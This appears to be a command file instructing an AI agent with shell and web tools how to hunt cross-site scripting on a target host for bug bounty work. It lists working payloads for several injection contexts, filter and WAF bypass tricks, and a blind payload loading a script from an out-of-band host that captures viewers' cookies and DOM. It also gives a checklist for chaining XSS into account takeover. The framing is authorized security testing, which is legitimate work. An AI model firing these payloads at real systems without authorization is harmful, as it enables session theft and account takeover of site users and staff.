---
description: Hunt client-side injection — reflected, stored, DOM and blind XSS — and chain it to impact.
argument-hint: <host>
allowed-tools: Bash, Read, Write, WebFetch
---

# /xss

`references/09`, `workflows/06`, `checklists/xss.md`.

**Input:** `$ARGUMENTS` — host.

```
/xss https://app.acme.com
```

The goal is not a popup. It is impact: a stolen session, an admin action, a
privilege change. If you cannot chain it, it is Medium at best.

---

## Step 1 — Sinks and renderers

Inputs that persist or render elsewhere:

- profile fields (name, bio, company, website)
- support tickets and messages — **rendered in the agent's panel: the HIGH path**
- comments, reviews, titles, filenames
- search terms reflected into the page
- error pages echoing input
- markdown fields, email/PDF templates, CSV/HTML exports
- anything rendered in an admin customer list

## Step 2 — Marker first

Submit a unique marker: `xssBBtest<random>`. Find it in the **raw** response
(`curl -s`, not the rendered DOM) and note the exact context:

| Context | How to break out |
|---|---|
| HTML body | `<svg onload=alert(1)>` |
| double-quoted attribute | `" onmouseover=alert(1) x="` |
| single-quoted attribute | `' onmouseover=alert(1) x='` |
| inside `<script>` string | `</script><svg onload=alert(1)>` |
| inside a URL attribute | `javascript:alert(1)` |
| inside `<style>` | `</style><svg onload=alert(1)>` |
| JSON in a script tag | `</script>` then payload |

Encoded (`&lt;`) in that context means that context is closed. Look for a
different sink — do not report an encoded reflection.

## Step 3 — Stored path

1. Submit into the field, reload, confirm it persists.
2. Open the page that renders it — as a second role if you can.
3. Fires for a privileged viewer (agent, admin) → that is the High.
4. Blind payload when you cannot see the panel:

```html
"><script src=https://<your-id>.oast.fun/x.js></script>
```

The callback gives you the URL, origin, cookies and DOM of whoever viewed it.

## Step 4 — DOM XSS

Grep the bundle for sinks and trace the source:

```js
innerHTML outerHTML document.write insertAdjacentHTML
eval new Function setTimeout("string")
location.search location.hash location.href window.name
```

Test through the fragment, which never reaches the server (and so bypasses WAFs):

```
https://<host>/page#<img src=x onerror=alert(1)>
```

Also check `postMessage` handlers: no `e.origin` check + `innerHTML` = DOM XSS
from any opener.

## Step 5 — Bypass the filter

Case mixing, alternate tags (`svg`, `img`, `details`, `math`, `video`), no
parentheses (`<svg onload=alert\`1\`>`), no spaces (`<svg/onload=alert(1)>`),
HTML entities, URL/unicode/double encoding, splitting across two params that get
concatenated, and mutation XSS through a sanitizer that re-parses.

A payload the WAF blocks is not a finding.

## Step 6 — Chain check

```bash
curl -sD- https://<host>/api/me -H "Cookie: <session>" | grep -i -E 'set-cookie|csp'
```

- [ ] Cookie without `HttpOnly` → `document.cookie` is enough
- [ ] CSP absent or `unsafe-inline` / wildcard → payload runs
- [ ] Session not rotated on login → stolen cookie survives
- [ ] Payload can call change-email / change-password via fetch (same-site)
- [ ] CSRF tokens not required on those state changes

All five → ATO → High. `HttpOnly` + strict CSP + rotation → Medium at best.

---

## Output shape

```
sinks tested: N   executing: N
type: reflected | stored | dom | blind
context: <the one that worked>
chain: <if any> → <impact>
severity: <band>
next: /score then /report
```

## Stop conditions

- Everything encoded and CSP strict → "closed", move to BOLA/logic.
- Blind payload hits from a real employee → capture the hit, remove the payload if
  you can, report immediately.
- Never leave a stored payload live in a production panel.
